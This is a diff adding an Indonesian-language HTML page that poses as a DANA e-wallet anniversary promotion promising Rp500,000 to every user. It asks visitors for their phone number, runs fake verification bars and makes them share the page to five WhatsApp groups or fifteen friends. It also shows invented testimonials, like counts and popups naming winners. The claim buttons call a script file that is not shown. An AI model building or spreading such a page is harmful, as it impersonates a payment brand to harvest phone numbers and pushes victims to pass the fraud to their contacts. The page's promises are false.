@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Hajatan Ulang Tahun DANA: Bagi-Bagi Saldo Rp500.000 untuk Semua Pengguna</title>
+    
+    <!-- Meta Tags -->
+    <meta name="og:title" content="Hajatan Ulang Tahun DANA: Bagi-Bagi Saldo Rp500.000 untuk Semua Pengguna">
+    <meta name="og:url" content="/">
+    <meta property="og:description" content="Saldo Rp500.000 tersedia untuk diklaim oleh semua pengguna dalam Hajatan Ulang Tahun DANA!">
+    <meta property="og:image" content="https://599cdn.com/Indonesia/dana417.jpg">
+    <meta property="og:type" content="website">
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Canvas Confetti -->
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.3.2/dist/confetti.browser.min.js"></script>
+    
+    <!-- External CSS -->
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+    <!-- Header Image -->
+    <div class="header-banner">
+        <img src="https://599cdn.com/Indonesia/dana417.jpg" alt="DANA Hajatan Ulang Tahun">
+    </div>
+
+    <!-- Title Bar -->
+    <div class="title-bar">
+        <b>🎉 Hajatan Ulang Tahun DANA: Bagi-Bagi Saldo Rp500.000 untuk Semua Pengguna</b>
+    </div>
+
+    <!-- Main Content -->
+    <div class="post">
+        <!-- Intro Section -->
+        <div id="intro">
+            <p class="welcome">
+                <br>
+                Silakan klik tombol "DAPATKAN" di bawah dan masukkan nomor ponsel Anda untuk mendapatkan saldo dari Hajatan Ulang Tahun DANA.
+            </p>
+            <button class="btn-primary" id="go">DAPATKAN</button>
+        </div>
+
+        <!-- Loader Section -->
+        <div id="loader">
+            <div>Mohon tunggu ...</div>
+            <div class="spin"></div>
+            <div id="num">0%</div>
+        </div>
+
+        <!-- Phone Input Section -->
+        <div id="info">
+            <p class="title">Masukkan nomor ponsel Anda:</p>
+            <div class="phone">
+                <input type="tel" placeholder="Nomor ponsel" id="phoneNumber" maxlength="15" onkeypress="return numberonly(event)">
+                <button class="btn-primary" id="confirm" style="width: 100%; margin-top: 15px;">Lanjut</button>
+            </div>
+            <p class="error" id="errorMsg">Silakan masukkan nomor ponsel yang valid!</p>
+        </div>
+
+        <!-- Checking Section -->
+        <div id="checking">
+            <p class="title">Memverifikasi nomor Anda...</p>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill2"></div>
+                </div>
+                <div class="percentage center">
+                    <span id="percentage2">0%</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Share Section -->
+        <div id="share">
+            <center>
+                <h3>
+                    <p class="tip">
+                        Nomor ponsel Anda: <span id="getname"></span>
+                    </p>
+                </h3>
+                <br>
+                <p class="tip">
+                    Selamat! Anda memenuhi syarat untuk menerima saldo Rp500.000 dari Hajatan Ulang Tahun DANA.<br>
+                    <span class="amount"><br>Cara klaim saldo Rp500.000 Anda?</span>
+                </p>
+                <p class="tip">1. Bagikan halaman ini ke 5 grup WhatsApp atau 15 teman menggunakan tombol "BAGIKAN" di bawah.</p>
+                <p class="tip">2. Setelah bilah verifikasi berwarna hijau terisi penuh, saldo Rp500.000 akan otomatis masuk ke akun DANA Anda.</p>
+                <p class="tip">3. Nikmati saldo Rp500.000 Anda dan gunakan langsung untuk transaksi!</p>
+
+                <div class="share-buttons">
+                    <button id="whatsapp-btn" class="share-btn whatsapp-btn" onclick="shareToWA()">
+                        <i class="fa fa-whatsapp"></i> Bagikan ke WhatsApp
+                    </button>
+                </div>
+
+                <div class="barr">
+                    <div class="fill">
+                        <div id="fill2-progress"></div>
+                    </div>
+                    <div class="percentage center">
+                        <span id="sharePercentage">0%</span>
+                    </div>
+                </div>
+                <p class="tip" id="shareStatus" style="color: #43B05F; font-weight: bold;"></p>
+            </center>
+        </div>
+
+        <!-- Claim Section -->
+        <div id="claim">
+            <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
+            <p class="title">Saldo Rp500.000 Anda telah disetujui! Klik tombol di bawah untuk menambahkannya ke akun DANA Anda.</p>
+            <a class="telbtn" href="#" onclick="claimReward(); return false;">
+                <span class="telp">🎉 VERIFIKASI SEKARANG 🎉</span>
+            </a>
+            <a class="telbtn" href="#" onclick="claimReward(); return false;">
+                <span class="telp">💰 DAPATKAN Rp500.000 💰</span>
+            </a>
+            <a class="telbtn" href="#" onclick="claimReward(); return false;">
+                <span class="telp">✅ AKTIFKAN SEKARANG ✅</span>
+            </a>
+        </div>
+
+        <!-- Footer Image -->
+        <img src="https://599cdn.com/Indonesia/dana4172.jpg" alt="DANA" class="footer-img">
+
+        <!-- Comments Section -->
+        <div class="comments">
+            <div class="counter">
+                <div class="reactions">
+                    <img src="https://599cdn.com/Indonesia/tx05.jpg" alt="like">
+                    <img src="https://599cdn.com/Indonesia/tx06.jpg" alt="love">
+                    <img src="https://599cdn.com/Indonesia/tx07.jpg" alt="care">
+                    <span id="likes">134 rb</span>
+                </div>
+                <div>
+                    <span id="comments-count">23 rb komentar</span>
+                    <span class="dot">·</span>
+                    <span id="shares">12 rb dibagikan</span>
+                </div>
+            </div>
+            <div class="bar">
+                <span class="react" onclick="likePost()"><i class="fa fa-thumbs-o-up"></i> Suka</span>
+                <span class="react"><i class="fa fa-comment-o"></i> Komentar</span>
+                <span class="react" onclick="shareToWA()"><i class="fa fa-share"></i> Bagikan</span>
+            </div>
+
+            <!-- Comments List -->
+            <div id="comments-list">
+                <div class="comment">
+                    <img src="https://599cdn.com/Indonesia/tx01.jpg" alt="avatar">
+                    <div class="single-container">
+                        <span class="user">Agus Setiawan</span>
+                        <span class="text">Awalnya saya kira ini tidak benar, tapi ternyata berhasil. Saldo DANA langsung masuk!</span>
+                    </div>
+                </div>
+                <div class="buttons" style="margin-left: 46px;">
+                    <span class="time">1 min</span>
+                    <span class="dot">·</span>
+                    <span class="action liked">Suka</span> · 
+                    <span class="action">Balas</span>
+                </div>
+
+                <div class="comment">
+                    <img src="https://599cdn.com/Indonesia/tx02.jpg" alt="avatar">
+                    <div class="single-container">
+                        <span class="user">Nur Aisyah</span>
+                        <span class="text">Sudah masuk! Aku langsung share ke teman-teman 👍</span>
+                    </div>
+                </div>
+                <div class="buttons" style="margin-left: 46px;">
+                    <span class="time">2 min</span>
+                    <span class="dot">·</span>
+                    <span class="action liked">Suka</span> · 
+                    <span class="action">Balas</span>
+                </div>
+
+                <div class="comment" style="margin-left: 36px;">
+                    <img src="https://599cdn.com/Indonesia/tx03.jpg" alt="avatar">
+                    <div class="single-container">
+                        <span class="user">Fajar Hidayat</span>
+                        <span class="text">Gila, saldo Rp500.000 beneran masuk 😭 Terima kasih DANA!</span>
+                    </div>
+                </div>
+                <div class="buttons" style="margin-left: 82px;">
+                    <span class="time">1 min</span>
+                    <span class="dot">·</span>
+                    <span class="action liked">Suka</span> · 
+                    <span class="action">Balas</span>
+                </div>
+
+                <div class="comment">
+                    <img src="https://599cdn.com/Indonesia/tx04.jpg" alt="avatar">
+                    <div class="single-container">
+                        <span class="user">Putri Maharani</span>
+                        <span class="text">Mantap banget! Terima kasih 💚</span>
+                    </div>
+                </div>
+                <div class="buttons" style="margin-left: 46px;">
+                    <span class="time">5 min</span>
+                    <span class="dot">·</span>
+                    <span class="action liked">Suka</span> · 
+                    <span class="action">Balas</span>
+                </div>
+            </div>
+
+            <div class="input">
+                <input type="text" placeholder="Tulis komentar ..." id="commentInput">
+            </div>
+        </div>
+    </div>
+
+    <!-- Popup Notifications -->
+    <div id="popup1" class="popup">🎊 Agus Setiawan from Jakarta menerima Saldo Rp500.000! 🎉</div>
+    <div id="popup2" class="popup">🎊 Nur Aisyah from Bandung menerima Saldo Rp500.000! 🎉</div>
+    <div id="popup3" class="popup">🎊 Fajar Hidayat from Surabaya menerima Saldo Rp500.000! 🎉</div>
+    <div id="popup4" class="popup">🎊 Putri Maharani from Medan menerima Saldo Rp500.000! 🎉</div>
+    <div id="popup5" class="popup">🎊 Rudi Hartono from Bekasi menerima Saldo Rp500.000! 🎉</div>
+
+    <!-- External JavaScript -->
+    <script src="script.js"></script>
+</body>
+          </html>
